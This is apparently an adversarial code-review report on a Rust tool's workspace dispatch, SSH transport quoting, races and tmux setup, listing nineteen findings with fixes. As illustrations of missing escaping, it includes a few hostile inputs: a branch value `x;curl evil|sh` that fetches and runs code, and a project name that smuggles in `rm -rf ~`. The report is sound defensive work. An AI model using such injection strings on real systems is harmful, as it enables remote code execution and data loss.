# Adversarial review: workspace lifecycle (orchestrator dispatch/handoff)

Reviewed (rebased onto `origin/main` @ `a106e8c`):

- `crates/shelbi-orchestrator/src/workspace.rs` (3085 lines) — dispatch, worktree lifecycle, review-marker read/clear, rebase-before-review, tmux pane setup, claude readiness, settings/agent-context/skills deploy
- `crates/shelbi-orchestrator/src/lifecycle.rs` (761 lines) — `Todo → InProgress` branch-cut + persist
- `crates/shelbi-orchestrator/src/review.rs` (445 lines) — review checkout + pane launch
- `crates/shelbi-orchestrator/src/lib.rs` (1430 lines) — tmux session/dashboard bootstrap, view swap, reload
- `crates/shelbi-orchestrator/src/contextstore.rs` (373 lines) — post-review rsync of ContextStore spaces
- `crates/shelbi-orchestrator/src/git.rs` (372 lines) — shared git/gh helpers (`run_in_dir`, login-shell prefix)
- `crates/shelbi-orchestrator/src/dispatch.rs` (238 lines) — pure agent-dispatch decision resolver

Supporting code read for context: `crates/shelbi-ssh/src/lib.rs` (transport), `crates/shelbi-tmux/src/lib.rs`, `crates/shelbi-tui/src/poller.rs` (marker consumer), `crates/shelbi-cli/src/commands/task.rs`, `crates/shelbi-core/src/model.rs` (`validate_task_id`), `crates/shelbi-agent/src/lib.rs` (`shell_escape`).

> **Transport contract (load-bearing).** `shelbi_ssh::build_command` (`crates/shelbi-ssh/src/lib.rs:64-75`) runs a remote command as `ssh <host> -- arg1 arg2 …`; OpenSSH joins those args with single spaces into **one** string the remote **login shell re-parses**. Its doc says *"no shell escaping yet — callers are expected to pass pre-escaped arguments."* `Host::Local` execs argv directly (no shell), so local hosts are unaffected. Every "unescaped over SSH" finding below is scoped to remote (`Host::Ssh`) workspaces and was checked against this transport; `shelbi_agent::shell_escape` is the intended fix.

> **Verified clean:** `dispatch.rs` is a pure, well-tested decision function (no I/O) — no defects found. `git.rs::run_login_shell_script` (`:51-58`) **correctly** single-quotes the composed script for the SSH path (`Host::Ssh { .. } => shelbi_agent::shell_escape(script)`), so `run_in_dir`'s `cd` + login-shell `-lc` survive the transport — a bug this class would otherwise have; called out as a positive.

| # | Finding | Severity | Confidence | Category |
|---|---------|----------|------------|----------|
| F1 | `refresh_agent_skills` runs `rm -rf <unescaped>` over SSH → a spaced remote `work_dir` word-splits and `rm -rf` targets the wrong directory | high | certain | hardening |
| F2 | Unescaped branch/path/task-id args on remote git/tmux/`cat`/`scp` calls → breakage on spaces + injection via unvalidated `--branch` | high | certain (spaces) / likely (injection) | hardening |
| F3 | Review pane uses a fixed 1500 ms sleep — no readiness probe, no trust-dialog dismissal → review prompt lost on a slow/fresh/remote pane | medium | certain (divergence) / likely (loss) | failure-scenario |
| F4 | ContextStore rsync local dest `~/…` isn't tilde-expanded (rsync has no shell) → sync lands in a literal `~` dir or fails; broken for the documented config | medium | certain | bug |
| F5 | Crash mid-dispatch leaves a partial worktree dir; next `git worktree add` refuses it and no prune/cleanup runs → dispatch wedged | medium | likely | failure-scenario |
| F6 | Dispatch/branch-cut is not serialized: TOCTOU branch-cut + lost-update save let two starts race one workspace and clobber task state | medium | likely | bug |
| F7 | `.claude/` is assumed gitignored but nothing ensures it; deployed files then dirty the worktree and the 2nd dispatch / review preflight bails | medium | likely | assumption |
| F8 | Torn/unvalidated review-marker read + clear-on-unloadable → lost handoff (stuck task); failed start-time clear can promote the wrong task | medium | likely | bug |
| F9 | `ensure_dashboard` never re-runs `create_hidden_views` after a 2-pane early return, and short-circuits on a half-created stash → views break permanently | medium | likely | failure-scenario |
| F10 | `machines_cmd` interpolates the raw project name into a single-quoted `echo` while every sibling value is escaped → breakage/injection | medium | certain | hardening |
| F11 | Concurrent `ensure_dashboard` double-splits or hard-errors and orphans the orchestrator pane | medium | likely | bug |
| F12 | Local dispatch computes `launch` (permission-mode + system prompt) then discards it, delegating to `open --as-pane` → divergent launch paths | medium | likely | simplification |
| F13 | `show_view` swallows a non-zero `swap-pane` exit → clicking a view silently no-ops on a stale pane id | low | likely | best-practice |
| F14 | `sync_worktree` (unlike `review.rs`) never releases a branch checked out in another worktree → re-dispatch dies on a raw git error | low | certain | bug |
| F15 | Review remote launch omits `LANG=C.UTF-8` (drift from `workspace.rs`) | low | certain | simplification |
| F16 | `local_branch_exists` treats git exit 128 (not-a-repo) as "branch absent" → misleading "base does not exist" error | low | certain | best-practice |
| F17 | ContextStore `body_matches` heuristic (`contains("cstore")`) is over-broad and substring-fragile | low | certain | best-practice |
| F18 | `review.rs` porcelain carve-out parses paths via `l.get(3..)`, mishandling renames and git-quoted names | low | likely | bug |
| F19 | `session-closed[42]` uses a fixed global hook slot and string-interpolates `#{hook_session_name}` into a shell `case` | low | likely | hardening |

---

## F1: `rm -rf` on an unescaped path over SSH can delete the wrong directory
- **Where:** `crates/shelbi-orchestrator/src/workspace.rs:1123` (`refresh_agent_skills`)
- **Category:** hardening (data loss) · **Severity / Confidence:** high / certain
- **Evidence:**
  ```rust
  let dest = worktree.join(".claude").join("skills");
  let dest_str = dest.to_string_lossy().into_owned();
  let rm = shelbi_ssh::run(host, ["rm", "-rf", &dest_str]).map_err(Error::Io)?;   // :1123
  ```
  `dest_str` = `<machine.work_dir>/.shelbi/wt/<workspace>/.claude/skills` (worktree from `workspace_worktree`, `:53`), passed raw.
- **Failure scenario:** A remote workspace whose `work_dir` is `/work/my app` (a space in a path is ordinary). Over SSH the transport sends `rm -rf /work/my app/.shelbi/wt/bob/.claude/skills`; the remote shell word-splits it and `rm -rf /work/my` **recursively deletes `/work/my`**. `refresh_agent_skills` runs on every dispatch (it clears carry-over skills), so the first remote dispatch to a spaced path is destructive; a `$()`/backtick/`;` in the workspace name injects.
- **Recommendation:** `shell_escape(&dest_str)` before the remote `rm`/`mkdir`; better, add per-arg escaping to the `shelbi-ssh` transport so the whole class is fixed centrally.
- **Effort:** S (call site) / M (transport)

## F2: Unescaped branch/path/task-id arguments on remote git, tmux, `cat`, and `scp`
- **Where:** `crates/shelbi-orchestrator/src/workspace.rs:85` (`cat`), `:100` (`rm -f`), `:386`/`:440` (tmux `-t <session>`), `:1374`/`:1398` (`mkdir`/`scp` target), `:1534-1602` (`sync_worktree`); `crates/shelbi-orchestrator/src/review.rs:239,276,305,320` (`git -C <repo>`, `test -e {wt}/.git`, `checkout <branch>`)
- **Category:** hardening · **Severity / Confidence:** high / certain (space breakage), likely (injection)
- **Evidence:** e.g.
  ```rust
  shelbi_ssh::run(host, ["cat", path.as_str()])                                  // workspace.rs:85
  ["git", "-C", &repo, "rev-parse", "--verify", branch]                          // workspace.rs (sync_worktree)
  let out = shelbi_ssh::run(host, ["git", "-C", &repo, "checkout", branch])       // review.rs:320
  ```
  None of `repo`, `wt_str`, `branch`, `default_branch`, or the marker path is escaped. Task ids are validated to kebab-case (`validate_task_id → validate_agent_id`, `crates/shelbi-core/src/model.rs:350-366`), so the *derived* `shelbi/<id>` branch is safe — **but** the `--branch` override (`task.rs`; `task.branch`) is never validated, and `work_dir`/worktree paths are free-form.
- **Failure scenario:** (a) Any remote workspace whose `work_dir` contains a space breaks every one of these commands (path splits; `test -e "{wt}/.git"` at `review.rs:276` misjudges existence, so the worktree release is silently skipped). (b) `shelbi task start t --branch 'x;curl evil|sh'` (or such a `branch:` in task frontmatter) reaches `git checkout` / `git worktree add` verbatim and executes on the worker host.
- **Recommendation:** Escape every variable argv element bound for a remote host (ideally in the transport, matching what `git.rs::run_login_shell_script` already does for scripts), and validate `--branch` with the task-id charset rule.
- **Effort:** M

## F3: Review pane never adopted the readiness probe or trust-dialog handling
- **Where:** `crates/shelbi-orchestrator/src/review.rs:207-211`
- **Category:** failure-scenario · **Severity / Confidence:** medium / certain (divergence), likely (loss)
- **Evidence:**
  ```rust
  shelbi_tmux::send_line(&host, &addr, &cd_launch)?;
  std::thread::sleep(std::time::Duration::from_millis(1500));    // :209
  let prompt = compose_review_prompt(&spec.task.id, &branch, spec.task_body);
  shelbi_tmux::send_line(&host, &addr, &prompt)?;
  ```
  The dispatch path deliberately replaced this fixed sleep with `wait_for_claude_ready` (polls `is_input_ready`, auto-confirms the trust dialog) plus a submission recheck (`workspace.rs:609-640`, and the readiness helpers). `review.rs` does none of it.
- **Failure scenario:** `resolve_review_machine` can pick an SSH machine and `start_review` creates the review session fresh over SSH (`review.rs:180-182`). On a slow claude boot, or first entry to an untrusted `work_dir` tree, at 1500 ms claude is still showing the "trust this folder" dialog (or hasn't drawn the input box); the review prompt is typed into the dialog / into scrollback and lost, so the reviewer's claude never receives its task context.
- **Recommendation:** Extract `wait_for_claude_ready`/`is_input_ready`/`is_trust_dialog` into a shared helper and use it from `start_review`; drop the fixed sleep.
- **Effort:** M

## F4: ContextStore rsync destination `~/…` is never tilde-expanded
- **Where:** `crates/shelbi-orchestrator/src/contextstore.rs:149-150`, `:157`, `:228-233`
- **Category:** bug · **Severity / Confidence:** medium / certain (verified empirically)
- **Evidence:**
  ```rust
  let src = format!("{ssh_host}:{path_str}/");   // :149  remote side — remote shell expands ~
  let dst = format!("{path_str}/");              // :150  local side — keeps the literal "~"
  … ensure_local_dir(&path_str) …               // :157  this one DOES expand_tilde (:228-233)
  let mut cmd = std::process::Command::new(&argv[0]); for a in &argv[1..] { cmd.arg(a); }
  ```
  `rsync` runs via `Command` (no shell), so the local `dst = "~/Documents/…/"` is a **literal** path. I verified: `rsync -az src/ '~/dest/'` tries to `mkdir ".../~/dest"` and errors — it does not expand `~` to `$HOME`. `ensure_local_dir` *does* `expand_tilde`, so it creates the correct `$HOME/…` dir while rsync writes elsewhere (or fails). The documented default config is exactly `~/Documents/ContextStore/<slug>` (`:246-254`).
- **Failure scenario:** A remote workspace writes a research note; on review promotion the rsync back to hub either errors (`SyncStatus::Failed`) or deposits files under a stray `./~/Documents/...` relative to the orchestrator's cwd. The user browses `~/Documents/ContextStore` on hub and the note is missing — the feature silently no-ops for the intended config.
- **Recommendation:** Use `expand_tilde(&path_str)` for the local `dst` (as `ensure_local_dir` already does), or run rsync through a login shell.
- **Effort:** S

## F5: A partial worktree from a crashed dispatch wedges future dispatches
- **Where:** `crates/shelbi-orchestrator/src/workspace.rs:1534-1554` (`sync_worktree` existence check + `git worktree add`)
- **Category:** failure-scenario · **Severity / Confidence:** medium / likely
- **Evidence:**
  ```rust
  let worktree_exists = run(host, ["test","-d",&format!("{wt_str}/.git")])?.status.success()
      || run(host, ["test","-f",&format!("{wt_str}/.git")])?.status.success();   // :1534
  if !worktree_exists { … "git","worktree","add", … }                            // :1554+
  ```
  Confirmed: no `git worktree prune`, no `--force`, no cleanup of a partial dir anywhere in `workspace.rs`.
- **Failure scenario:** `git worktree add` populates the directory; the process is killed (or SSH drops) after the dir exists but before `.git` is written. Next dispatch: `test -d/-f <wt>/.git` → false → `git worktree add <wt> <branch>` aborts with `fatal: '<wt>' already exists` (or `already registered`). The error surfaces, but the workspace is permanently un-dispatchable until someone manually `rm -rf`s the dir and runs `git worktree prune`.
- **Recommendation:** Before `git worktree add`, run `git worktree prune`; if `<wt>` exists without a valid `.git`, `git worktree remove --force`/`rm -rf` it, then add.
- **Effort:** M

## F6: Dispatch and branch-cut are not serialized
- **Where:** `crates/shelbi-orchestrator/src/workspace.rs:471` (`start_workspace_on_task`); `crates/shelbi-orchestrator/src/lifecycle.rs:119-122` (`cut_branch_on_hub`), `:157-166` (`ensure_branch_for_in_progress`)
- **Category:** bug (race) · **Severity / Confidence:** medium / likely
- **Evidence:**
  - `cut_branch_on_hub` is check-then-act: `if local_branch_exists(&host, &wt, branch)? { return Ok(()); } …` then `git branch <branch> <base>` (`:122+`) — no lock.
  - `ensure_branch_for_in_progress` does `load_task → mutate branch → save_task(whole task)` (`:157-166`); `updated_at` is overwritten, not compared.
  - `start_workspace_on_task` clears the marker, `sync_worktree`s, deploys, kills+recreates the pane with no per-workspace lock.
- **Failure scenario:** Two starts for one workspace (CLI `task start` racing a TUI kanban move, or two operators). Both pass the CLI's InProgress conflict check (which runs before either task is persisted), both enter `sync_worktree`/`checkout` on the shared worktree, both recreate the same pane — interleaving into a branch/pane mismatch. Separately, `ensure_branch_for_in_progress`'s read-modify-write clobbers a concurrent `column`/`assigned_to`/`priority` edit made between its load and save.
- **Recommendation:** Take a per-workspace lock (flock on the worktree dir) around the sync+spawn; treat `git branch` "already exists" as success; use a compare-and-swap on `updated_at` (or a targeted "set branch" API) instead of round-tripping the whole task.
- **Effort:** M

## F7: `.claude/` is assumed gitignored, but nothing makes it so
- **Where:** `crates/shelbi-orchestrator/src/workspace.rs:69` (doc of the assumption), `:1588` (dirty gate), deploys at `refresh_agent_skills`/`deploy_*`; `crates/shelbi-orchestrator/src/review.rs:246-247` (preflight carve-out)
- **Category:** assumption · **Severity / Confidence:** medium / likely
- **Evidence:** `workspace.rs:69` states the assumption (`.claude/` must be gitignored so deploys don't dirty the worktree). But the only auto-gitignore adds `.shelbi/`, not `.claude/` (`crates/shelbi-cli/src/commands/spawn.rs`), while the deploy helpers write under `<worktree>/.claude/`. `sync_worktree`'s dirty gate is a plain `git status --porcelain` with no `.claude/` carve-out (message at `:1588`), and `review.rs`'s preflight carve-out covers only `.shelbi/`/`.gitignore` (`:246-247`).
- **Failure scenario:** A repo that doesn't ignore `.claude/` (common — many commit it): the first dispatch writes `.claude/settings.json`; the worktree is now dirty; the **second** `task start` bails ("uncommitted changes"), and `shelbi review` bails identically. The workspace is single-use per repo until manual cleanup.
- **Recommendation:** Have `spawn`'s gitignore step also cover the shelbi-written `.claude/` files, and add the `.claude/` carve-out to `sync_worktree` and `review.rs::preflight`.
- **Effort:** S

## F8: A torn/unvalidated marker read loses the handoff; a failed start-clear can promote the wrong task
- **Where:** `crates/shelbi-orchestrator/src/workspace.rs:83-92` (`read_review_marker`), `:98-100` (`clear_review_marker`), `:499` (best-effort start-time clear); consumer `crates/shelbi-tui/src/poller.rs:518-523`
- **Category:** bug · **Severity / Confidence:** medium / likely
- **Evidence:**
  ```rust
  let content = String::from_utf8_lossy(&out.stdout).trim().to_string();
  Ok((!content.is_empty()).then_some(content))          // workspace.rs:91-92 — any nonempty string is a task id
  ```
  The workspace is told to write the marker exactly once (`compose_prompt`). The consumer clears the marker on the `load_task` **error** path (`poller.rs:518-523`: "review marker names unloadable task; clearing"), and the start-time clear is best-effort (`workspace.rs:499`: `let _ = clear_review_marker(...)`).
- **Failure scenario:** (a) *Torn read:* the poller `cat`s the marker while the workspace's `printf … > marker` is mid-write, yielding a truncated id → `load_task` fails → poller clears the marker → the workspace never rewrites it → the task is stuck in `in_progress` with no surfaced error. (b) *Stale promote:* workspace `bob` finishes task A (marker="A"), is reassigned to B, the start-time clear fails transiently and is ignored, and a slow poller reads "A" before B overwrites — promoting a task no longer owned by this workspace.
- **Recommendation:** Validate marker content against `validate_task_id` and the workspace's current assignment; don't clear on read/parse failure (only after a successful promote); have the workspace write atomically (`> tmp && mv`).
- **Effort:** S

## F9: `ensure_dashboard` can't recover a half-created view stash
- **Where:** `crates/shelbi-orchestrator/src/lib.rs:353` (early return) + `:486` (`create_hidden_views` call site follows it); `:499` (stash short-circuit)
- **Category:** failure-scenario · **Severity / Confidence:** medium / likely
- **Evidence:**
  ```rust
  if pane_count >= 2 { return Ok(BootstrapStatus::AlreadyRunning); }   // :353  (returns before create_hidden_views)
  … fn create_hidden_views(…) { if shelbi_tmux::has_session(host, &stash)? { return Ok(()); } … }  // :486, :499
  ```
- **Failure scenario:** A prior bootstrap split the dashboard (2 panes, `SHELBI_PANE_orch` set) but then errored inside `create_hidden_views` (e.g. a stash `split-window` failed). Every later call sees `pane_count >= 2` and returns at line 353, so `create_hidden_views` never re-runs; the `_shelbi-<project>` stash is missing and `show_view("tasks"|"review"|"machines"|"activity")` fails forever. Symmetrically, a stash with only its first pane makes line 499 short-circuit and the other `SHELBI_PANE_*` are never set. `reload` can't heal it (it splits `_session:views`, which may not exist).
- **Recommendation:** Run `create_hidden_views` independent of the `pane_count >= 2` early return, and gate its short-circuit on all `SHELBI_PANE_*` env vars being present, not just session existence.
- **Effort:** M

## F10: `machines_cmd` interpolates the raw project name into a single-quoted `echo`
- **Where:** `crates/shelbi-orchestrator/src/lib.rs:791`
- **Category:** hardening · **Severity / Confidence:** medium / certain
- **Evidence:**
  ```rust
  "while true; do printf '\\033c'; echo 'workspaces · {label}'; … {bin} --project {proj} … ",
  bin = shelbi_agent::shell_escape(shelbi_bin),
  proj = shelbi_agent::shell_escape(project_name),
  label = project_name,          // :791 — raw, unlike every sibling
  ```
- **Failure scenario:** A project name containing `'` (e.g. `o'brien`) closes the quote and breaks the machines-view render loop; a crafted name like `x'; rm -rf ~; echo '` executes inside the `while true; … sh -c` loop. `load_project` does not charset-validate the project name.
- **Recommendation:** Use the escaped `{proj}` for the label too, or drop the raw `label` binding.
- **Effort:** S

## F11: Concurrent `ensure_dashboard` double-splits or hard-errors
- **Where:** `crates/shelbi-orchestrator/src/lib.rs:292` (session-create check), `:353` (pane-count check), `:368` (split)
- **Category:** bug (race) · **Severity / Confidence:** medium / likely
- **Evidence:** `if !shelbi_tmux::has_session(&host, session)? { … "new-session" … }` (`:292-297`) and `let pane_count = …; if pane_count >= 2 { return … }` (`:353`) are both check-then-act with no lock.
- **Failure scenario:** The TUI launcher and `shelbi orchestrate` interleave. On create, both pass `!has_session` and run `new-session`; the loser's `run_capture` gets tmux's "duplicate session" non-zero and `?`-propagates as a hard error. On split, both read `pane_count < 2` and both `split-window` (`:368`), yielding 3 panes and `SHELBI_PANE_orch` overwritten with the second pane's id — orphaning the first orchestrator pane.
- **Recommendation:** Serialize bootstrap with a per-project flock, or make create/split idempotent by re-checking after the op and tolerating "already exists".
- **Effort:** M

## F12: Local dispatch discards the computed `launch` string
- **Where:** `crates/shelbi-orchestrator/src/workspace.rs:545-549` (computes `launch`) vs `:580-601` (local arm) / `:604` (SSH arm)
- **Category:** simplification (divergence) · **Severity / Confidence:** medium / likely
- **Evidence:**
  ```rust
  let launch = with_agent_system_prompt(&shelbi_agent::launch_command(&runner_with_mode),
      spec.agent.map(|_| WORKTREE_AGENT_INSTRUCTIONS_REL), &runner);   // :545-549
  match &host {
      Host::Local => { … pane_cmd = "{bin} --project {proj} open {ws} --as-pane"; local_pane_tmux_argv(…) }  // :580-601 — `launch` UNUSED
      Host::Ssh { .. } => { let cd_launch = remote_cd_launch(&worktree, &launch); … }                        // :604 — only user of `launch`
  }
  ```
  The comment at `:540-542` says the `--permission-mode` CLI flag "is authoritative and belongs to the spawn path" — yet for local dispatch that flag (and the agent system prompt in `launch`) is computed and thrown away, with correctness delegated to `shelbi open --as-pane` re-deriving them. Two launch-construction paths that must stay in sync.
- **Failure scenario:** If `open --as-pane` drifts (or fails to apply `--permission-mode`), local workspaces silently run in the wrong permission mode / without the agent prompt — the exact "settings-based mode is fragile" failure this code says it avoids.
- **Recommendation:** Thread `launch` through the local path too, or centralize launch construction so local and remote can't diverge.
- **Effort:** M

## F13: `show_view` swallows a failed `swap-pane`
- **Where:** `crates/shelbi-orchestrator/src/lib.rs:166`
- **Category:** best-practice · **Severity / Confidence:** low / likely
- **Evidence:** `let _ = std::process::Command::new("tmux").args(["swap-pane","-s",pane_id,"-t",&dashboard]).status().map_err(Error::Io)?;` — the `?` only catches spawn failure; a non-zero exit is discarded.
- **Failure scenario:** The stored `SHELBI_PANE_*` id no longer exists (e.g. the user killed `_shelbi-foo`). `swap-pane` exits non-zero, the view doesn't change, and `show_view` returns `Ok(())` — the user clicks a view and nothing happens, with no diagnostic.
- **Recommendation:** Check `status.success()` and return `Error::Other` with the pane id/stderr.
- **Effort:** S

## F14: `sync_worktree` never releases a branch checked out elsewhere
- **Where:** `crates/shelbi-orchestrator/src/workspace.rs:1602` (`git checkout <branch>`); contrast `crates/shelbi-orchestrator/src/review.rs:263` (`release_branch_from_workspace_worktrees`)
- **Category:** bug · **Severity / Confidence:** low / certain
- **Evidence:** `sync_worktree` just runs `git checkout <branch>` (`:1602`). `review.rs` explicitly detaches any other workspace worktree sitting on the target branch first, because git refuses to check out a branch already checked out in another worktree.
- **Failure scenario:** Task T (branch `shelbi/T`) is live on workspace `alice`; `shelbi task start T --worker bob` reaches `sync_worktree` for `bob`, which runs `git checkout shelbi/T` → `fatal: 'shelbi/T' is already checked out at '<alice's worktree>'`. Dispatch dies on a raw git error the review path would have handled.
- **Recommendation:** Reuse the review-side release logic in `sync_worktree`, or detect and message the "already checked out" case.
- **Effort:** S

## F15: Review remote launch omits `LANG=C.UTF-8`
- **Where:** `crates/shelbi-orchestrator/src/review.rs:202` vs `crates/shelbi-orchestrator/src/workspace.rs:1309` (remote launch)
- **Category:** simplification (drift) · **Severity / Confidence:** low / certain
- **Evidence:** dispatch's remote launch uses `"cd {wd} && LANG=C.UTF-8 SHELBI_HUB_SOCK={sock} exec \"${SHELL:-/bin/bash}\" -lc {launch}"`; review's uses `"cd {wd} && exec \"${SHELL:-/bin/bash}\" -lc {launch}"` (`:202`) with **no** `LANG=C.UTF-8`, so a remote review pane on a C-locale tmux server can mangle the box-drawing glyphs.
- **Recommendation:** Add `LANG=C.UTF-8` to the review launch (and centralize the launch template — see F12).
- **Effort:** S

## F16: `local_branch_exists` conflates "branch absent" with "not a repo"
- **Where:** `crates/shelbi-orchestrator/src/lifecycle.rs:174-177`
- **Category:** best-practice · **Severity / Confidence:** low / certain
- **Evidence:** `let out = run_in_dir(host, wt, &["git","rev-parse","--verify","--quiet",&ref_name])?; Ok(out.status.success())` — `rev-parse` exits 1 for a missing ref but 128 for a broken/missing repo; both map to `false`.
- **Failure scenario:** A mis-located hub `work_dir` makes both the branch and base checks return `false`, so `cut_branch_on_hub` reports `base '<x>' does not exist on the hub repo` — pointing the user at a phantom missing-branch problem instead of "not a git repository".
- **Recommendation:** Distinguish exit 1 (`Ok(false)`) from exit 128 (propagate as `Error::Command`).
- **Effort:** S

## F17: ContextStore `body_matches` heuristic is over-broad
- **Where:** `crates/shelbi-orchestrator/src/contextstore.rs:100-104`
- **Category:** best-practice · **Severity / Confidence:** low / certain
- **Evidence:** `let mentions_cstore = body.contains("cstore"); … filter(|s| mentions_cstore || body.contains(&format!("{}/", s.space)))`.
- **Failure scenario:** Any task body that merely contains the substring `cstore` (this very review task does) triggers an rsync of **all** configured spaces from the remote — combined with F4 that's a wasted/failing sync each time. `contains("cstore")` also matches inside larger tokens (e.g. `cstorexyz`).
- **Recommendation:** Match a word-boundaried `cstore` invocation (or an explicit marker the agent writes) rather than a raw substring. (The generosity is intentional per the module doc, but pair it with a real signal.)
- **Effort:** S

## F18: `review.rs` porcelain carve-out mis-parses renames and quoted paths
- **Where:** `crates/shelbi-orchestrator/src/review.rs:246-247`
- **Category:** bug · **Severity / Confidence:** low / likely
- **Evidence:** `let path = l.get(3..).unwrap_or(""); !(path.starts_with(".shelbi/") || …)`.
- **Failure scenario:** For a path with special chars git emits a quoted porcelain form (`?? ".shelbi/weird name"`), so `path` starts with `"` and the `.shelbi/` prefix check misses → shelbi's own metadata reads as user-dirty and the review bails. Rename rows (`R  old -> new`) put `old -> new` in `path`, comparing against the composite string.
- **Recommendation:** Use `--porcelain -z`, strip a leading quote, and split rename rows on ` -> ` (take the destination) before the prefix check.
- **Effort:** S

## F19: `session-closed[42]` uses a fixed global slot and interpolates the session name into a shell `case`
- **Where:** `crates/shelbi-orchestrator/src/lib.rs:628-631`
- **Category:** hardening · **Severity / Confidence:** low / likely
- **Evidence:** `["tmux","set-hook","-g","session-closed[42]", hook_cmd]` where `hook_cmd` = `run-shell -b "case \"#{hook_session_name}\" in shelbi-*) tmux kill-session -t \"_#{hook_session_name}\" …"`.
- **Failure scenario:** (a) Index 42 on the *global* server hook table silently overwrites (or is overwritten by) any other tool using `session-closed[42]`. (b) tmux expands `#{hook_session_name}` into a double-quoted `sh` string with no escaping; a session/project name containing `"`, `` ` `` or `$(` breaks out. Project names aren't charset-validated, so this is reachable via a hostile config.
- **Recommendation:** Register at a free/append index, and pass the session name as a positional (`sh -c '…' _ "$1"`) rather than interpolating it into the command body.
- **Effort:** M

---

### Seed questions — dispositions

- **Two dispatches racing one workspace / double assignment:** yes — F6. Nothing serializes `start_workspace_on_task`, the CLI conflict check is TOCTOU, and `ensure_branch_for_in_progress` does a lost-update read-modify-write.
- **Review marker: partial write / stale / stale branch:** torn read + clear-on-unloadable loses the signal, and a failed best-effort start-clear can promote the wrong task — F8. (The *stale-and-not-ours* case is otherwise handled: the poller re-checks column + `assigned_to` before promoting.)
- **Crash mid-dispatch → half-created worktree:** leaked and blocking — F5.
- **Branch cutting when base is missing / remote unreachable:** `sync_worktree` never fetches and cuts off a bare local `default_branch`; a missing local base fails with a raw git error (surfaced, not silent). `cut_branch_on_hub` (`lifecycle.rs:119`) turns a missing base into a clear `Error::Other` — a deliberate, correct choice — but carries the TOCTOU of F6. The in-prompt rebase instruction does `git fetch origin`, while the hub-side rebase deliberately does not fetch and skips if the ref is absent.
- **contextstore rsync: remote paths with spaces, rsync missing, partial transfer:** the local-dest tilde bug (F4) is the dominant defect; additionally a spaced remote `path` would break the `{ssh_host}:{path}` src (unescaped), and `rsync` missing/failing is captured into `SyncStatus::Failed` and correctly never blocks promotion.
- **handoff.md read/delete race:** N/A — the handoff is the `.claude/shelbi-review-ready` marker, not a `handoff.md`; its races are F8.
- **Environment propagation to workers (TASK_ID etc.):** the task id reaches the workspace mainly via the composed prompt text and the marker path (`compose_prompt`). Runtime env *is* now propagated — `SHELBI_HUB_SOCK` on both paths and the task id/project threaded into the local pane wrapper via `local_pane_tmux_argv` (`workspace.rs:591-599`), plus `LANG=C.UTF-8` — but local vs SSH construct it through **different** code paths (F12), and the launch/env template is duplicated across `workspace.rs`/`review.rs` (F12/F15) rather than living in one place, which is where drift creeps in.

---

> **Review provenance note.** The scope files were refactored heavily on `main` during this review (my branch base was 40 commits stale at one point). This report was re-verified and re-anchored against `origin/main @ a106e8c`; all line numbers and quotes are from that tree. One earlier candidate finding — an SSH quoting bug in `git.rs::run_in_dir` — was **dropped** because the current `run_login_shell_script` (`git.rs:51-58`) already single-quotes the script for the SSH transport, which fixes it.
